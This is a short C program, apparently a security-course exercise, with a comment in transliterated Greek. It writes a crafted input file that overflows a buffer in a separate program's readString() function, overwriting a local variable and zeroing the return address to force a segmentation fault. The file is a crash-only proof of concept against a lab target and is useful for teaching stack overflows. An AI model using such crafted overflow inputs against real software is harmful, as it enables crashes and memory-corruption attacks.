#include <stdio.h>

/* To en logw arxeio paragei ena file, to opoio an dothei
ws input sto hello prokallei segmentation fault. Ousiastika,
dinontas ws input pliroforia megaluteri apo to megethos tou
buffer, panwgrafw (overwrite) kai ta upoloipa dedomena tou
stack frame tis readString(). Auto exei ws apotelesma
tin allagi tou return address (diladi twn tessarwn (pro)teleutaiwn
bytes tou en logw stack frame) se 0x00000000. Sunepws, otan
i sunartisi epixirei na epistrepsei stin kalousa, prospelaunei
mnimi ektos twn epitreptwn oriwn, ara prokaleitai crash (seg fault)*/

int main(){
	FILE *fp;
	int i;
	fp = fopen("data3", "w+");
	for(i = 0; i < 48; i++) /*add zeros till we can overwrite i variable*/
		putc('\0', fp);
	putc(56,fp); /* i = 56; //Skip overwriting unnecessary staff*/
	for(i = 0; i < 4; i++) /*overwrite return address*/
		putc(0x00, fp);
	return 0;
}	